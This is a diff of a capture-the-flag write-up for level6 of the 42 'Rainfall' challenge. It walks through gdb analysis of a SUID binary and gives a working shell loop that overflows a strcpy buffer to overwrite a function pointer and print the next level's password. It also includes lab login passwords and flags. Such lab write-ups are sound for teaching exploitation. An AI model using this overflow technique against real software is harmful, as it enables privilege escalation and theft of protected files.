@@ -1,8 +1,17 @@
 Login as `level6`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.0.18 -p 4242 -l level6
 level6@192.168.0.18's password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -12,8 +21,8 @@ total 8
 ```
 By looking binary, three functions are defined.
 1. `n()` function calls `system("/bin/cat /home/user/level7/.pass")`
-2. `m()` function outputs a line "Nope" on stdout
-3. `main()` which allocates 64 a 4 bytes, assing `m()` to a function pointer variable, calls `strcpy()` and finally calls function pointer.
+2. `m()` function outputs a line "Nope" on `stdout`
+3. `main()` which allocates 64 a 4 bytes, assign `m()` to a function pointer variable, calls `strcpy()` and finally calls function pointer.
 ```gdb
 level6@RainFall:~$ gdb ./level6
 (gdb) info functions
@@ -78,17 +87,19 @@ End of assembler dump.
 ```
 SECURITY CONSIDERATIONS section on man page of `strcpy` indicates that the `strcpy()` can be misused in a manner which enables to change a running program's functionality through a buffer overflow attack.
 
-By running executable with first argument containing 128 bytes, is seems that the value of fuction pointer is overwritten and program try to call something `0x41414141`.
+By running executable with first argument containing 128 bytes, is seems that the value of function pointer is overwritten and program try to call something `0x41414141`.
 ```gdb
 level6@RainFall:~$ gdb -q ./level6
 Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
 (gdb) run $(python -c "print 'A'*128")
 Starting program: /home/user/level6/level6 $(python -c "print 'A'*128")
 
-Program received signal SIGSEGV, Segmentation fault.
+Program received signal `SIGSEGV`, Segmentation fault.
 0x41414141 in ?? ()
 ```
-So, using address of `n()` function as argumet it can be repeated n-times until it lay in right place.
+So, using address of `n()` function as argument it can be repeated n-times until it lay in right place.
+
+Exploit and log on to the next level.
 ```shell
 level6@RainFall:~$ for i in {0..100}; do ./level6 $(python -c "print '\x54\x84\x04\x08'*$i") | grep -v Nope && break; done
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
